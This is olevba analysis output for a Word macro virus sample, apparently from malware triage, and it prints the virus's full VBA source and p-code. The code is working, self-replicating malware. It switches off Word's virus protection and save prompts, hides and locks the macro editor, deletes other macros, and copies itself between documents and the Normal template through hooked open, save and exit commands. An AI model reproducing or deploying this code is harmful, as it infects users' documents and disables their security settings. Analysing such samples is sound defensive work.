olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bptk.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bptk.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
t = "D"
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
Else: t = ""
End If
If t <> "" Then
d.Codemodule.Deletelines 1, d.Codemodule.CountOfLines
d.Codemodule.AddFromString c.Codemodule.Lines(1, c.Codemodule.CountOfLines)
ActiveDocument.Save
NormalTemplate.Save
End If
Randomize
If Rnd < 0.3 Then MsgBox "ÁÏÒÊ"
End Sub


-------------------------------------------------------------------------------
VBA MACRO CyberHack.bas 
in file: ./Virus.MSWord.Bptk.c - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By WinK'S Hacker
' Picture By Casper Satan

' Lebih baik mencoba dari pada tidak tahu sama sekali ...
' Mohon ma'af bila telah mengganggu Anda.
' Microsoft memang gila ! Nambahin fasilitas pemrogramannya
' keterlaluan untuk suatu word prosesor.
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For I = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Norok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For I = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      NMacr = NT.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set AD = ActiveDocument
    If DokSave = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Cyber
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsMacro()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO CyberForm.frm 
in file: ./Virus.MSWord.Bptk.c - OLE stream: 'Macros/VBA/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



















































































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bptk.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2556 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0001 "D"
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #4:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #5:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #6:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #7:
' 	EndWith 
' Line #8:
' 	LitStr 0x0001 "D"
' 	St t 
' Line #9:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	ElseIfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set c 
' Line #15:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St t 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld c 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld d 
' 	MemLd Codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #21:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "ÁÏÒÊ"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' Macros/VBA/CyberHack - 11919 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 " Macros By WinK'S Hacker"
' Line #1:
' 	QuoteRem 0x0000 0x0018 " Picture By Casper Satan"
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0038 " Lebih baik mencoba dari pada tidak tahu sama sekali ..."
' Line #4:
' 	QuoteRem 0x0000 0x0028 " Mohon ma'af bila telah mengganggu Anda."
' Line #5:
' 	QuoteRem 0x0000 0x003A " Microsoft memang gila ! Nambahin fasilitas pemrogramannya"
' Line #6:
' 	QuoteRem 0x0000 0x0027 " keterlaluan untuk suatu word prosesor."
' Line #7:
' 	Dim (Public) 
' 	VarDefn AlAsal
' Line #8:
' 	Dim (Public) 
' 	VarDefn DokSave
' Line #9:
' 	Dim (Public) 
' 	VarDefn Norok
' Line #10:
' 	Dim (Public) 
' 	VarDefn Dokok
' Line #11:
' 	FuncDefn (Sub CyInit())
' Line #12:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St AlAsal 
' Line #13:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #14:
' 	ArgsCall (Call) Tahan 0x0000 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #17:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #18:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #19:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #22:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #23:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #24:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #25:
' 	OnError (GoTo 0) 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub CyClose())
' Line #28:
' 	Ld AlAsal 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Dok2Nor())
' Line #31:
' 	ArgsCall (Call) Tahan 0x0000 
' Line #32:
' 	OnError Erw1 
' Line #33:
' 	LitVarSpecial (False)
' 	St Norok 
' Line #34:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #35:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #36:
' 	OnError Erh1a 
' Line #37:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #38:
' 	Ld I 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #39:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Norok 
' 	EndIf 
' Line #40:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #41:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Label Erh1a 
' Line #45:
' 	Ld Norok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #46:
' 	OnError Erh1 
' Line #47:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberHack"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #50:
' 	Label Erh1 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Label Erw1 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub Nor2Dok())
' Line #55:
' 	OnError Erw2 
' Line #56:
' 	LitDI2 0x0000 
' 	St DokSave 
' Line #57:
' 	LitVarSpecial (False)
' 	St Dokok 
' Line #58:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #59:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #60:
' 	OnError Erh2a 
' Line #61:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #62:
' 	Ld I 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #63:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #64:
' 	Ld I 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #65:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #66:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #67:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	Label Erh2a 
' Line #71:
' 	Ld Dokok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	OnError Erh2 
' Line #73:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberHack"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #74:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #75:
' 	LitDI2 0x0001 
' 	St DokSave 
' Line #76:
' 	Label Erh2 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Label Erw2 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub Cyber())
' Line #81:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #82:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #83:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub Tahan())
' Line #86:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #87:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #88:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #89:
' 	EndWith 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub Simpan())
' Line #92:
' 	OnError Erh4 
' Line #93:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #94:
' 	Ld DokSave 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Label Erh4 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub AutoOpen())
' Line #100:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub FileClose())
' Line #103:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #104:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #105:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #106:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #107:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub FileOpen())
' Line #110:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #111:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #112:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #113:
' 	ArgsCall (Call) Simpan 0x0000 
' Line #114:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub FileSaveAs())
' Line #117:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #118:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #119:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #120:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #121:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub FileSave())
' Line #124:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #125:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #126:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #127:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #128:
' 	OnError Errh1 
' Line #129:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #130:
' 	Label Errh1 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub HelpAbout())
' Line #133:
' 	OnError Erw3 
' Line #134:
' 	Ld CyberForm 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	Label Erw3 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub FileExit())
' Line #138:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #139:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #140:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #141:
' 	OnError Erw4 
' Line #142:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CyberForm 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #143:
' 	Label Erw4 
' Line #144:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #145:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub ToolsOptions())
' Line #148:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub FileNew())
' Line #152:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #153:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub FileTemplates())
' Line #156:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub ToolsMacro())
' Line #159:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ToolsCustomize())
' Line #162:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #165:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub ViewVBCode())
' Line #168:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub Organizer())
' Line #171:
' 	EndSub 
' Macros/VBA/CyberForm - 2677 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #116:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #117:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S'S
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN './Virus.MSWord.Bptk.c' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
